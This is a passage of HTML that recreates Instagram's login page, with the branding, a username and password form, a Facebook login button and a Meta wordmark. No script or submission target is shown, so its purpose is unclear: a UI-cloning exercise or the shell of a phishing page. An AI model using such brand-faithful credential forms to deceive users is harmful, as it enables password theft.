                        </svg>
                    </div>
                    <!-- Hero Text -->
                    <h1 class="hero-text">See everyday moments from your <span class="green-text">close friends</span>.</h1>
                    <!-- Collage Image -->
                    <div class="collage-wrap">
                        <img src="image.png" alt="Close friends" class="collage-img">
                    </div>
                </div>
            </div>

            <!-- RIGHT SIDE -->
            <div class="right-side">
                <div class="right-inner">
                    <h2 class="login-heading">Log into Instagram</h2>

                    <form id="login-form" class="login-form" novalidate>
                        <div class="field">
                            <input type="text" id="username" name="username" placeholder=" " autocomplete="username">
                            <label for="username">Mobile number, username or email</label>
                        </div>
                        <div class="field">
                            <input type="password" id="password" name="password" placeholder=" " autocomplete="current-password">
                            <label for="password">Password</label>
                            <button type="button" class="toggle-pw" id="toggle-pw" tabindex="-1">
                                <!-- eye-off (default) -->
                                <svg class="ico-off" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#a0a0a0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
                                <!-- eye-on (hidden) -->
                                <svg class="ico-on" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#a0a0a0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                            </button>
                        </div>
                        <button type="submit" class="btn-login" id="btn-login" disabled>Log in</button>
                    </form>

                    <a href="#" class="forgot-link">Forgot password?</a>

                    <button class="btn-fb" id="btn-fb">
                        <svg width="20" height="20" viewBox="0 0 24 24"><circle cx="12" cy="12" r="12" fill="#1877F2"/><path d="M16.87 13.12l.43-2.81h-2.7v-1.82c0-.77.38-1.52 1.58-1.52h1.23V4.56s-1.11-.19-2.17-.19c-2.22 0-3.67 1.35-3.67 3.78v2.14H9.19v2.81h2.38v6.8a9.44 9.44 0 002.93 0v-6.8h2.37z" fill="#fff"/></svg>
                        <span>Log in with Facebook</span>
                    </button>

                    <button class="btn-create" id="btn-create">Create new account</button>

                    <div class="meta-mark">
                        <span class="meta-infinity">∞</span><span class="meta-word">Meta</span>
                    </div>
                </div>
            </div>
